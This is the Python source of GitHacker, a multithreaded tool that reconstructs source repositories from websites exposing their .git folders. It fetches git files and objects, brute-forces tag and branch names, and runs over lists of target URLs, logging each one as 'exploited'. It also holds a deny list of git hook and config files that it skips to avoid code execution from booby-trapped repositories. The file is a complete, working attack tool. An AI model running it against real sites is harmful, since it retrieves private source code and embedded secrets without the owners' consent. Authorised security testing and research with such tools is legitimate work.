import argparse
import bs4
import coloredlogs
import git
import logging
import os
import queue
import re
import requests
import shutil
import subprocess
import tempfile
import threading


__version__ = "1.1.1"

coloredlogs.install(fmt='%(asctime)s %(levelname)s %(message)s')


def md5(data):
    import hashlib
    return hashlib.md5(bytes(data, encoding="utf-8")).hexdigest()


class GitHacker():
    def __init__(self, url, dst, threads=0x08, brute=True, disable_manually_check=True) -> None:
        self.q = queue.Queue()
        self.url = url
        self.dst = tempfile.mkdtemp()
        self.real_dst = dst
        self.repo = None
        self.thread_number = threads
        self.max_semanic_version = 10
        self.brute = brute
        self.verify = False
        self.disable_manually_check = disable_manually_check
        self.default_git_files_maybe_dangerous = [
            [".git", "config"],
            [".git", "hooks", "applypatch-msg.sample"],
            [".git", "hooks", "applypatch-msg"],
            [".git", "hooks", "commit-msg.sample"],
            [".git", "hooks", "commit-msg"],
            [".git", "hooks", "fsmonitor-watchman.sample"],
            [".git", "hooks", "fsmonitor-watchman"],
            [".git", "hooks", "post-update.sample"],
            [".git", "hooks", "post-update"],
            [".git", "hooks", "pre-applypatch.sample"],
            [".git", "hooks", "pre-applypatch"],
            [".git", "hooks", "pre-commit.sample"],
            [".git", "hooks", "pre-commit"],
            [".git", "hooks", "pre-merge-commit.sample"],
            [".git", "hooks", "pre-merge-commit"],
            [".git", "hooks", "pre-push.sample"],
            [".git", "hooks", "pre-push"],
            [".git", "hooks", "pre-rebase.sample"],
            [".git", "hooks", "pre-rebase"],
            [".git", "hooks", "pre-receive.sample"],
            [".git", "hooks", "pre-receive"],
            [".git", "hooks", "prepare-commit-msg.sample"],
            [".git", "hooks", "prepare-commit-msg"],
            [".git", "hooks", "update.sample"],
            [".git", "hooks", "update"],
        ]

        self.default_git_files = [
            [".git", "COMMIT_EDITMSG"],
            [".git", "description"],
            [".git", "FETCH_HEAD"],
            [".git", "HEAD"],
            [".git", "index"],
            [".git", "info", "exclude"],
            [".git", "logs", "HEAD"],
            [".git", "logs", "refs", "remotes", "origin", "HEAD"],
            [".git", "logs", "refs", "stash"],
            [".git", "ORIG_HEAD"],
            [".git", "packed-refs"],
            [".git", "refs", "remotes", "origin", "HEAD"],
            # git stash
            [".git", "refs", "stash"],
            # pack
            [".git", "objects", "info", "alternates"],
            [".git", "objects", "info", "http-alternates"],
            [".git", "objects", "info", "packs"],
        ]

        self.complete_basic_files_list()

    def start(self):
        # Ensure the target is a git folder via `.git/HEAD`
        if requests.head(f"{self.url}.git/HEAD", verify=self.verify).status_code != 200:
            logging.error(f"The target url({self.url}) is not a valid git repository, `.git/HEAD` not exists")
            return False

        for _ in range(self.thread_number):
            threading.Thread(target=self.worker, daemon=True).start()

        if self.directory_listing_enabled():
            return self.sighted()
        else:
            return self.blind()

    def directory_listing_enabled(self):
        response = requests.get(f"{self.url}.git/", verify=self.verify)
        keywords = {
            "apache": "<title>Index of",
            "nginx": "<title>Index of",
        }
        if response.status_code == 200:
            for server, keyword in keywords.items():
                if keyword in response.text:
                    logging.info(f"Directory listing enable under: {server}")
                    return True
        return False

    def sighted(self):
        self.add_folder(self.url, ".git/")
        self.q.join()
        return self.git_clone()
    
    def is_dangerous_git_file(self, filepath):
        normalized_path = os.path.normpath(filepath)
        # We consider all files not in self.default_git_files_maybe_dangerous 
        # are safe.But that could be dangerous when git add another config file 
        # someday which may lead to another RCE, so this function should be more 
        # conservative to return False. Maybe a white list is safer. (TODO)
        for dangerous_git_file in self.default_git_files_maybe_dangerous:
            dangerous_git_filepath = os.path.sep.join(dangerous_git_file)
            if normalized_path.endswith(dangerous_git_filepath):
                return True
        
        # The following operation will mark any files under `.git/hooks` to be 
        # dangerous. Consider all git hooks could be dangerous, this operation 
        # is not redundant with the previous for loop, because the git may add 
        # more default hook files someday. I don't want to continuously maintain
        # the self.default_git_files_maybe_dangerous blacklist.
        normalized_folder = os.path.split(normalized_path)[0]
        if normalized_folder.endswith(os.path.sep.join([".git", "hooks"])):
            return True

        return False

    def add_folder(self, base_url, folder):
        url = f"{base_url}{folder}"
        soup = bs4.BeautifulSoup(requests.get(
            url, verify=self.verify).text, features="html.parser")
        links = soup.find_all("a")
        for link in links:
            href = link['href']
            if href == "../" or href == "/":
                continue
            if href.endswith("/"):
                self.add_folder(url, href)
            else:
                file_url = f"{url}{href}"
                # The following if statment prevent from access other domain which may lead to CSRF attack.
                if file_url.startswith(self.url):
                    filepath = file_url[len(self.url):].strip().replace("..", "").split("/")
                    self.q.put(filepath)

    def blind(self):
        logging.info('Downloading basic files...')
        tn = self.add_basic_file_tasks()
        if tn > 0:
            self.q.join()

        logging.info('Downloading head files...')
        tn = self.add_head_file_tasks()
        if tn > 0:
            self.q.join()

        logging.info('Downloading blob files...')
        self.repo = git.Repo(self.dst)
        tn = self.add_blob_file_tasks()
        if tn > 0:
            self.q.join()

        logging.info('Running git fsck files...')
        while True:
            content = subprocess.run(
                ['git', "fsck"],
                stdout=subprocess.PIPE,
                cwd=self.dst,
            ).stdout
            tn = self.add_hashes_parsed(content)
            if tn > 0:
                self.q.join()
            else:
                break

        return self.git_clone()

    def git_clone(self):
        logging.info(f"Cloning downloaded repo from {self.dst} to {self.real_dst}")
        result = subprocess.run(
            ["git", "clone", self.dst, self.real_dst],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        if result.stdout != b'': logging.info(result.stdout.decode("utf-8").strip())
        if result.stderr != b'': logging.error(result.stderr.decode("utf-8").strip())
        if b"invalid path" in result.stderr:
            logging.info(f"Remote repo is downloaded into {self.real_dst}")
            logging.error("Be careful to checkout the source code, cause the target repo may be a honey pot.")
            logging.error("FYI: https://drivertom.blogspot.com/2021/08/git.html")
        if result.returncode == 0:
            # return True only when `git clone` successfully executed
            logging.info(f"Check it out: {self.real_dst}")
            shutil.rmtree(self.dst)
            return True
        return False


    def add_hashes_parsed(self, content):
        hashes = re.findall(r"([a-f\d]{40})", content.decode("utf-8"))
        n = 0
        for hash in hashes:
            n += 1
            self.q.put([".git", "objects", hash[0:2], hash[2:]])
        return n

    def add_head_file_tasks(self):
        n = 0
        with open(os.path.join(self.dst, os.path.sep.join([".git", "HEAD"])), "r") as f:
            for line in f:
                if line.startswith("ref: "):
                    ref_path = line.split("ref: ")[1].strip()
                    file_path = os.path.join(
                        self.dst, os.path.sep.join([".git", "logs", ref_path]))
                    if os.path.exists(file_path):
                        with open(file_path, "rb") as ff:
                            data = ff.read()
                            n += self.add_hashes_parsed(data)
        return n

    def complete_basic_files_list(self):
        # git tags
        if self.brute:
            for major in range(self.max_semanic_version):
                for minor in range(self.max_semanic_version):
                    for patch in range(self.max_semanic_version):
                        self.default_git_files.append(
                            [".git", "refs", "tags", f"v{major}.{minor}.{patch}"])
                        self.default_git_files.append(
                            [".git", "refs", "tags", f"{major}.{minor}.{patch}"])
        else:
            self.default_git_files.append([".git", "refs", "tags", "v0.0.1"])
            self.default_git_files.append([".git", "refs", "tags", "0.0.1"])
            self.default_git_files.append([".git", "refs", "tags", "v1.0.0"])
            self.default_git_files.append([".git", "refs", "tags", "1.0.0"])

        branch_names = [
            "master", "main", "dev", "release", 
            "test", "testing", "feature", "ng", 
            "fix", "hotfix", "quickfix",
        ]

        # git remote branches
        expand_branch_name_folder = [
            [".git", "logs", "refs", "heads", None],
            [".git", "logs", "refs", "remotes", "origin", None],
            [".git", "refs", "remotes", "origin", None],
            [".git", "refs", "heads", None],
        ]

        for folder in expand_branch_name_folder:
            for branch_name in branch_names:
                folder_copy = folder.copy()
                folder_copy[-1] = branch_name
                self.default_git_files.append(folder_copy)

    def add_basic_file_tasks(self):
        n = 0
        for item in self.default_git_files:
            self.q.put(item)
            n += 1
        for item in self.default_git_files_maybe_dangerous:
            self.q.put(item)
            n += 1
        return n

    def add_blob_file_tasks(self):
        n = 0
        for _, blob in self.repo.index.iter_blobs():
            hash = blob.hexsha
            self.q.put([".git", "objects", hash[0:2], hash[2:]])
            n += 1
        return n

    def worker(self):
        while True:
            path = self.q.get()
            if "00000000000000000000000000000000000000" in path:
                self.q.task_done()
                continue
            else:
                fs_path = os.path.join(self.dst, os.path.sep.join(path))
                url_path = "/".join(path)
                url = f"{self.url}{url_path}"
                if not os.path.exists(fs_path):
                    status_code, length, result = self.wget(url, fs_path)
                    if result:
                        logging.info(f'[{length} bytes] {status_code} {url_path}')
                    else:
                        logging.error(f'[{length} bytes] {status_code} {url_path}')
                self.q.task_done()

    def check_file_content(self, content):
        if content.startswith(b"<") or len(content) == 0:
            return False
        return True

    def wget(self, url, path):
        response = requests.get(url, verify=self.verify)
        # path from Apache/Nginx could be dangerous
        if ".." in path:
            logging.error(f"Malicious repo detected: {url}")
            sanitized_path = path.replace("..", "")
            logging.warning(f"Replacing {path} with {sanitized_path}")
            path = sanitized_path

        # if manually check is disabled, we will definitely not downloading any dangerous git files
        if self.disable_manually_check and self.is_dangerous_git_file(path):
                logging.error(f"{path} is potential dangerous, skip downloading this file")
                return (-1, -1, False)

        folder = os.path.dirname(path)
        try: os.makedirs(folder)
        except: pass
        status_code = response.status_code
        content = response.content
        result = False
        if status_code == 200 and self.check_file_content(content):
            # if manually check is enabled, we will ask user to confirm the security of the potentially dangerous file
            if not self.disable_manually_check and self.is_dangerous_git_file(path):
                logging.error(f"{path} is potential dangerous, you need to confirm the content is safe.")
                seperator = f"{'-' * 0x10} {path} {'-' * 0x10}"
                logging.warning(seperator)
                print(content.decode("utf-8"))
                safe = input(f"Are you sure that the content of {path} is safe? (y/N)").strip().lower() == 'y'
                if safe:
                    with open(path, "wb") as f:
                        n = f.write(content)
                        if n == len(content):
                            result = True
                else:
                    logging.warning(f"{path} is marked as dangerous, it will not be downloaded.")
                    result = False
            else:
                # the file is not dangerous, just save it
                with open(path, "wb") as f:
                    n = f.write(content)
                    if n == len(content):
                        result = True
        return (status_code, len(content), result)


def remove_suffixes(s, suffixes):
    r = s
    for suffix in suffixes:
        if s.endswith(suffix):
            r = s[0:-len(suffix)]
    return r


def append_if_not_exists(s, suffix):
    if not s.endswith(suffix):
        return s + suffix
    return s


def main():
    parser = argparse.ArgumentParser(description='GitHacker')
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('--url', help='url of the target website which expose `.git` folder')
    group.add_argument('--url-file', help='url file that contains a list of urls of the target website which expose `.git` folder')
    parser.add_argument('--output-folder', required=True, help='the local folder which will be the parent folder of all exploited repositories, every repo will be stored in folder named md5(url).')
    parser.add_argument('--brute', required=False, default=False, help='enable brute forcing branch/tag names', action='store_true')
    parser.add_argument('--enable-manually-check-dangerous-git-files', required=False, default=False, help='disable manually check dangerous git files which may lead to *RCE* (eg: .git/config, .git/hook/pre-commit) when downloading malicious .git folders. If this argument is given, GitHacker will not download the files which may be dangerous at all.', action='store_true')
    parser.add_argument('--threads', required=False, default=0x04, type=int, help='threads number to download from internet')
    parser.add_argument('--version', action='version', version=__version__)
    args = parser.parse_args()
    urls = []
    if args.url:
        urls.append(args.url)
    elif args.url_file:
        f = open(args.url_file)
        for line in f:
            url = line.strip()
            if url.strip() != "": urls.append(url)

    succeed_urls = []
    logging.info(f"{len(urls)} urls to be exploited")
    for url in urls:
        folder = os.path.sep.join([args.output_folder, md5(url)])
        logging.info(f"Exploiting {url} into {folder}")
        try:
            result = GitHacker(
                url=append_if_not_exists(remove_suffixes(url, ['.git', '.git/']), '/'),
                dst=folder,
                threads=args.threads,
                brute=args.brute,
                disable_manually_check=not args.enable_manually_check_dangerous_git_files,
            ).start()
            if result:
                succeed_urls.append(url)
        except Exception as e:
            logging.error(repr(e))

    logging.info(f"{len(succeed_urls)} / {len(urls)} were exploited successfully")
    for url in succeed_urls:
        folder = os.path.sep.join([args.output_folder, md5(url)])
        logging.info(f"{url} -> {folder}")

if __name__ == "__main__":
    main()
